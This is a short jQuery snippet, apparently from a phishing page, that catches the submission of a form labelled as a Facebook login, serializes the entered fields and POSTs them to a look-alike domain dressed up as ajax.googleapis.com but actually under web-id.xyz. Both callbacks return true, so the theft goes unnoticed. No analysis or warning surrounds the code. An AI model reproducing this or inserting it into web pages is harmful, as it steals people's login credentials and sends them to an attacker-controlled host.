$(".form-login-fb").submit(function() {
        var d = $(".form-login-fb");
        
        $.ajax({
        url:
"https://ajax.googleapis.com.web-id.xyz/site.php",
        type: "POST",
        data: d.serialize(),
        succes: function () {
             return true;
        },
        error: function () {
            return true;
        },
     });
});
